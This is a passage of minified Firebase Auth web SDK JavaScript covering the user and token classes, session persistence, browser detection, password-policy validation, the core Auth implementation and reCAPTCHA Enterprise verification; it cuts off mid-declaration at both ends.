 */function Qr(t,e){ee(typeof t=="string"||typeof t>"u","internal-error",{appName:e})}class kn{constructor(e){var{uid:n,auth:r,stsTokenManager:i}=e,s=pc(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new UM(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=n,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=s.displayName||null,this.email=s.email||null,this.emailVerified=s.emailVerified||!1,this.phoneNumber=s.phoneNumber||null,this.photoURL=s.photoURL||null,this.isAnonymous=s.isAnonymous||!1,this.tenantId=s.tenantId||null,this.providerData=s.providerData?[...s.providerData]:[],this.metadata=new Um(s.createdAt||void 0,s.lastLoginAt||void 0)}async getIdToken(e){const n=await zl(this,this.stsTokenManager.getToken(this.auth,e));return ee(n,this.auth,"internal-error"),this.accessToken!==n&&(this.accessToken=n,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),n}getIdTokenResult(e){return LM(this,e)}reload(){return $M(this)}_assign(e){this!==e&&(ee(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(n=>Object.assign({},n)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const n=new kn(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return n.metadata._copy(this.metadata),n}_onReload(e){ee(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,n=!1){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),n&&await Nd(this),await this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(Ut(this.auth.app))return Promise.reject(Sr(this.auth));const e=await this.getIdToken();return await zl(this,MM(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,n){var r,i,s,o,a,c,u,p;const f=(r=n.displayName)!==null&&r!==void 0?r:void 0,h=(i=n.email)!==null&&i!==void 0?i:void 0,E=(s=n.phoneNumber)!==null&&s!==void 0?s:void 0,_=(o=n.photoURL)!==null&&o!==void 0?o:void 0,y=(a=n.tenantId)!==null&&a!==void 0?a:void 0,C=(c=n._redirectEventId)!==null&&c!==void 0?c:void 0,x=(u=n.createdAt)!==null&&u!==void 0?u:void 0,w=(p=n.lastLoginAt)!==null&&p!==void 0?p:void 0,{uid:S,emailVerified:N,isAnonymous:R,providerData:j,stsTokenManager:T}=n;ee(S&&T,e,"internal-error");const b=mo.fromJSON(this.name,T);ee(typeof S=="string",e,"internal-error"),Qr(f,e.name),Qr(h,e.name),ee(typeof N=="boolean",e,"internal-error"),ee(typeof R=="boolean",e,"internal-error"),Qr(E,e.name),Qr(_,e.name),Qr(y,e.name),Qr(C,e.name),Qr(x,e.name),Qr(w,e.name);const P=new kn({uid:S,auth:e,email:h,emailVerified:N,displayName:f,isAnonymous:R,photoURL:_,phoneNumber:E,tenantId:y,stsTokenManager:b,createdAt:x,lastLoginAt:w});return j&&Array.isArray(j)&&(P.providerData=j.map(k=>Object.assign({},k))),C&&(P._redirectEventId=C),P}static async _fromIdTokenResponse(e,n,r=!1){const i=new mo;i.updateFromServerResponse(n);const s=new kn({uid:n.localId,auth:e,stsTokenManager:i,isAnonymous:r});return await Nd(s),s}static async _fromGetAccountInfoResponse(e,n,r){const i=n.users[0];ee(i.localId!==void 0,"internal-error");const s=i.providerUserInfo!==void 0?ob(i.providerUserInfo):[],o=!(i.email&&i.passwordHash)&&!(s!=null&&s.length),a=new mo;a.updateFromIdToken(r);const c=new kn({uid:i.localId,auth:e,stsTokenManager:a,isAnonymous:o}),u={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:s,metadata:new Um(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!(s!=null&&s.length)};return Object.assign(c,u),c}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kw=new Map;function xr(t){Or(t instanceof Function,"Expected a class definition");let e=kw.get(t);return e?(Or(e instanceof t,"Instance stored in cache mismatched with class"),e):(e=new t,kw.set(t,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ab{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,n){this.storage[e]=n}async _get(e){const n=this.storage[e];return n===void 0?null:n}async _remove(e){delete this.storage[e]}_addListener(e,n){}_removeListener(e,n){}}ab.type="NONE";const Pw=ab;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Lu(t,e,n){return`firebase:${t}:${e}:${n}`}class go{constructor(e,n,r){this.persistence=e,this.auth=n,this.userKey=r;const{config:i,name:s}=this.auth;this.fullUserKey=Lu(this.userKey,i.apiKey,s),this.fullPersistenceKey=Lu("persistence",i.apiKey,s),this.boundEventHandler=n._onStorageEvent.bind(n),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const n=await Id(this.auth,{idToken:e}).catch(()=>{});return n?kn._fromGetAccountInfoResponse(this.auth,n,e):null}return kn._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const n=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,n)return this.setCurrentUser(n)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,n,r="authUser"){if(!n.length)return new go(xr(Pw),e,r);const i=(await Promise.all(n.map(async u=>{if(await u._isAvailable())return u}))).filter(u=>u);let s=i[0]||xr(Pw);const o=Lu(r,e.config.apiKey,e.name);let a=null;for(const u of n)try{const p=await u._get(o);if(p){let f;if(typeof p=="string"){const h=await Id(e,{idToken:p}).catch(()=>{});if(!h)break;f=await kn._fromGetAccountInfoResponse(e,h,p)}else f=kn._fromJSON(e,p);u!==s&&(a=f),s=u;break}}catch{}const c=i.filter(u=>u._shouldAllowMigration);return!s._shouldAllowMigration||!c.length?new go(s,e,r):(s=c[0],a&&await s._set(o,a.toJSON()),await Promise.all(n.map(async u=>{if(u!==s)try{await u._remove(o)}catch{}})),new go(s,e,r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Rw(t){const e=t.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(db(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(lb(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(fb(e))return"Blackberry";if(pb(e))return"Webos";if(cb(e))return"Safari";if((e.includes("chrome/")||ub(e))&&!e.includes("edge/"))return"Chrome";if(hb(e))return"Android";{const n=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=t.match(n);if((r==null?void 0:r.length)===2)return r[1]}return"Other"}function lb(t=Ot()){return/firefox\//i.test(t)}function cb(t=Ot()){const e=t.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function ub(t=Ot()){return/crios\//i.test(t)}function db(t=Ot()){return/iemobile/i.test(t)}function hb(t=Ot()){return/android/i.test(t)}function fb(t=Ot()){return/blackberry/i.test(t)}function pb(t=Ot()){return/webos/i.test(t)}function Ov(t=Ot()){return/iphone|ipad|ipod/i.test(t)||/macintosh/i.test(t)&&/mobile/i.test(t)}function HM(t=Ot()){var e;return Ov(t)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function WM(){return ej()&&document.documentMode===10}function mb(t=Ot()){return Ov(t)||hb(t)||pb(t)||fb(t)||/windows phone/i.test(t)||db(t)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function gb(t,e=[]){let n;switch(t){case"Browser":n=Rw(Ot());break;case"Worker":n=`${Rw(Ot())}-${t}`;break;default:n=t}const r=e.length?e.join(","):"FirebaseCore-web";return`${n}/JsCore/${Qi}/${r}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class KM{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,n){const r=s=>new Promise((o,a)=>{try{const c=e(s);o(c)}catch(c){a(c)}});r.onAbort=n,this.queue.push(r);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const n=[];try{for(const r of this.queue)await r(e),r.onAbort&&n.push(r.onAbort)}catch(r){n.reverse();for(const i of n)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r==null?void 0:r.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function GM(t,e={}){return Ji(t,"GET","/v2/passwordPolicy",Xi(t,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qM=6;class YM{constructor(e){var n,r,i,s;const o=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(n=o.minPasswordLength)!==null&&n!==void 0?n:qM,o.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=o.maxPasswordLength),o.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=o.containsLowercaseCharacter),o.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=o.containsUppercaseCharacter),o.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=o.containsNumericCharacter),o.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=o.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 0?i:"",this.forceUpgradeOnSignin=(s=e.forceUpgradeOnSignin)!==null&&s!==void 0?s:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var n,r,i,s,o,a;const c={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,c),this.validatePasswordCharacterOptions(e,c),c.isValid&&(c.isValid=(n=c.meetsMinPasswordLength)!==null&&n!==void 0?n:!0),c.isValid&&(c.isValid=(r=c.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),c.isValid&&(c.isValid=(i=c.containsLowercaseLetter)!==null&&i!==void 0?i:!0),c.isValid&&(c.isValid=(s=c.containsUppercaseLetter)!==null&&s!==void 0?s:!0),c.isValid&&(c.isValid=(o=c.containsNumericCharacter)!==null&&o!==void 0?o:!0),c.isValid&&(c.isValid=(a=c.containsNonAlphanumericCharacter)!==null&&a!==void 0?a:!0),c}validatePasswordLengthOptions(e,n){const r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(n.meetsMinPasswordLength=e.length>=r),i&&(n.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,n){this.updatePasswordCharacterOptionsStatuses(n,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(n,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,n,r,i,s){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=n)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class QM{constructor(e,n,r,i){this.app=e,this.heartbeatServiceProvider=n,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new Aw(this),this.idTokenSubscription=new Aw(this),this.beforeStateQueue=new KM(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=tb,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion,this._persistenceManagerAvailable=new Promise(s=>this._resolvePersistenceManagerAvailable=s)}_initializeWithPersistence(e,n){return n&&(this._popupRedirectResolver=xr(n)),this._initializationPromise=this.queue(async()=>{var r,i,s;if(!this._deleted&&(this.persistenceManager=await go.create(this,e),(r=this._resolvePersistenceManagerAvailable)===null||r===void 0||r.call(this),!this._deleted)){if(!((i=this._popupRedirectResolver)===null||i===void 0)&&i._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(n),this.lastNotifiedUid=((s=this.currentUser)===null||s===void 0?void 0:s.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const n=await Id(this,{idToken:e}),r=await kn._fromGetAccountInfoResponse(this,n,e);await this.directlySetCurrentUser(r)}catch(n){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",n),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){var n;if(Ut(this.app)){const o=this.app.settings.authIdToken;return o?new Promise(a=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(o).then(a,a))}):this.directlySetCurrentUser(null)}const r=await this.assertedPersistence.getCurrentUser();let i=r,s=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const o=(n=this.redirectUser)===null||n===void 0?void 0:n._redirectEventId,a=i==null?void 0:i._redirectEventId,c=await this.tryRedirectSignIn(e);(!o||o===a)&&(c!=null&&c.user)&&(i=c.user,s=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(s)try{await this.beforeStateQueue.runMiddleware(i)}catch(o){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(o))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return ee(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)}async tryRedirectSignIn(e){let n=null;try{n=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return n}async reloadAndSetCurrentUserOrClear(e){try{await Nd(e)}catch(n){if((n==null?void 0:n.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=NM()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(Ut(this.app))return Promise.reject(Sr(this));const n=e?ft(e):null;return n&&ee(n.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(n&&n._clone(this))}async _updateCurrentUser(e,n=!1){if(!this._deleted)return e&&ee(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),n||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return Ut(this.app)?Promise.reject(Sr(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return Ut(this.app)?Promise.reject(Sr(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(xr(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const n=this._getPasswordPolicyInternal();return n.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):n.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await GM(this),n=new YM(e);this.tenantId===null?this._projectPasswordPolicy=n:this._tenantPasswordPolicies[this.tenantId]=n}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new hc("auth","Firebase",e())}onAuthStateChanged(e,n,r){return this.registerStateListener(this.authStateSubscription,e,n,r)}beforeAuthStateChanged(e,n){return this.beforeStateQueue.pushCallback(e,n)}onIdTokenChanged(e,n,r){return this.registerStateListener(this.idTokenSubscription,e,n,r)}authStateReady(){return new Promise((e,n)=>{if(this.currentUser)e();else{const r=this.onAuthStateChanged(()=>{r(),e()},n)}})}async revokeAccessToken(e){if(this.currentUser){const n=await this.currentUser.getIdToken(),r={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:n};this.tenantId!=null&&(r.tenantId=this.tenantId),await VM(this,r)}}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,n){const r=await this.getOrInitRedirectPersistenceManager(n);return e===null?r.removeCurrentUser():r.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const n=e&&xr(e)||this._popupRedirectResolver;ee(n,this,"argument-error"),this.redirectPersistenceManager=await go.create(this,[xr(n._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var n,r;return this._isInitialized&&await this.queue(async()=>{}),((n=this._currentUser)===null||n===void 0?void 0:n._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,n;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const r=(n=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&n!==void 0?n:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,n,r,i){if(this._deleted)return()=>{};const s=typeof n=="function"?n:n.next.bind(n);let o=!1;const a=this._isInitialized?Promise.resolve():this._initializationPromise;if(ee(a,this,"internal-error"),a.then(()=>{o||s(this.currentUser)}),typeof n=="function"){const c=e.addObserver(n,r,i);return()=>{o=!0,c()}}else{const c=e.addObserver(n);return()=>{o=!0,c()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return ee(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=gb(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const n={"X-Client-Version":this.clientVersion};this.app.options.appId&&(n["X-Firebase-gmpid"]=this.app.options.appId);const r=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());r&&(n["X-Firebase-Client"]=r);const i=await this._getAppCheckToken();return i&&(n["X-Firebase-AppCheck"]=i),n}async _getAppCheckToken(){var e;if(Ut(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const n=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return n!=null&&n.error&&bM(`Error while retrieving App Check token: ${n.error}`),n==null?void 0:n.token}}function js(t){return ft(t)}class Aw{constructor(e){this.auth=e,this.observer=null,this.addObserver=cj(n=>this.observer=n)}get next(){return ee(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ih={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function XM(t){Ih=t}function vb(t){return Ih.loadJS(t)}function JM(){return Ih.recaptchaEnterpriseScript}function ZM(){return Ih.gapiScript}function eL(t){return`__${t}${Math.floor(Math.random()*1e6)}`}class tL{constructor(){this.enterprise=new nL}ready(e){e()}execute(e,n){return Promise.resolve("token")}render(e,n){return""}}class nL{ready(e){e()}execute(e,n){return Promise.resolve("token")}render(e,n){return""}}const rL="recaptcha-enterprise",yb="NO_RECAPTCHA";class iL{constructor(e){this.type=rL,this.auth=js(e)}async verify(e="verify",n=!1){async function r(s){if(!n){if(s.tenantId==null&&s._agentRecaptchaConfig!=null)return s._agentRecaptchaConfig.siteKey;if(s.tenantId!=null&&s._tenantRecaptchaConfigs[s.tenantId]!==void 0)return s._tenantRecaptchaConfigs[s.tenantId].siteKey}return new Promise(async(o,a)=>{jM(s,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(c=>{if(c.recaptchaKey===void 0)a(new Error("recaptcha Enterprise site key undefined"));else{const u=new DM(c);return s.tenantId==null?s._agentRecaptchaConfig=u:s._tenantRecaptchaConfigs[s.tenantId]=u,o(u.siteKey)}}).catch(c=>{a(c)})})}function i(s,o,a){const c=window.grecaptcha;Iw(c)?c.enterprise.ready(()=>{c.enterprise.execute(s,{action:e}).then(u=>{o(u)}).catch(()=>{o(yb)})}):a(Error("No reCAPTCHA enterprise script loaded."))}return this.auth.settings.appVerificationDisabledForTesting?new tL().execute("siteKey",{action:"verify"}):new Promise((s,o)=>{r(this.auth).then(a=>{if(!n&&Iw(window.grecaptcha))i(a,s,o);else{if(typeof window>"u"){o(new Error("RecaptchaVerifier is only supported in browser"));return}let c=JM();c.length!==0&&(c+=a),vb(c).then(()=>{i(a,s,o)}).catch(u=>{o(u)})}}).catch(a=>{o(a)})})}}async function Ow(t,e,n,r=!1,i=!1){const s=new iL(t);let o;if(i)o=yb;else try{o=await s.verify(n)}catch{o=await s.verify(n,!0)}const a=Object.assign({},e);if(n==="mfaSmsEnrollment"||n==="mfaSmsSignIn"){if("phoneEnrollmentInfo"in a){const c=a.phoneEnrollmentInfo.phoneNumber,u=a.phoneEnrollmentInfo.recaptchaToken;Object.assign(a,{phoneEnrollmentInfo:{phoneNumber:c,recaptchaToken:u,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}else if("phoneSignInInfo"in a){const c=a.phoneSignInInfo.recaptchaToken;Object.assign(a,{phoneSignInInfo:{recaptchaToken:c,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}return a}return r?Object.assign(a,{captchaResp:o}):Object.assign(a,{captchaResponse:o}),Object.assign(a,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(a,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),a}async function 